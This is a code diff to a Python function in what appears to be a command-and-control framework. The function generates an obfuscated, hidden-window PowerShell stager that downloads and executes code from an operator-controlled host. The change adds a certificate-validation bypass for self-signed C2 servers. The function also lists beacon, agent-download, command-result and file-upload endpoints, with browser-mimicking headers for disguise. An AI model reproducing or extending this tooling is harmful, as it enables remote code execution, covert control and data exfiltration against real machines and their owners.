@@ -47,7 +47,26 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     
     http = "https" if ssl else "http"
     stager_path = url_paths["stager_path"]
-    agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{stager_path}');IEX($S)"
+    
+    # Base agent code
+    base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{stager_path}');IEX($S)"
+    
+    # Add SSL certificate validation bypass if using SSL
+    if ssl:
+        agent = (
+            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
+            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
+            "try {\n"
+            f"    {base_agent}\n"
+            "} catch {\n"
+            "    $errorMessage = $_.Exception.Message\n"
+            "    $errorDetails = $_ | Format-List -Force | Out-String\n"
+            "    Write-Host \"Error connecting to C2: $errorMessage`n$errorDetails\"\n"
+            "}"
+        )
+    else:
+        agent = base_agent
+    
     encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
     powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
     
@@ -57,14 +76,16 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         f"1. Base Command: {powershell_command}\n"
         f"2. Encryption: {key_info}\n"
         f"3. System Identification: Full system identification enabled\n"
-        f"4. Communication Paths:\n"
+        f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
+        f"5. Communication Paths:\n"
         f"   - Beacon URL: {http}://{host}:{port}{url_paths['beacon_path']}\n"
         f"   - Agent Download URL: {http}://{host}:{port}{url_paths['agent_path']}\n"
         f"   - Stager URL: {http}://{host}:{port}{url_paths['stager_path']}\n"
         f"   - Command Result URL: {http}://{host}:{port}{url_paths['cmd_result_path']}\n"
         f"   - File Upload URL: {http}://{host}:{port}{url_paths['file_upload_path']}\n"
-        f"5. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
-        f"6. Headers: Legitimate web browsing headers included\n"
+        f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
+        f"7. Headers: Legitimate web browsing headers included\n"
+        f"8. Error Handling: Enhanced error reporting enabled\n"
     )
     
     result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
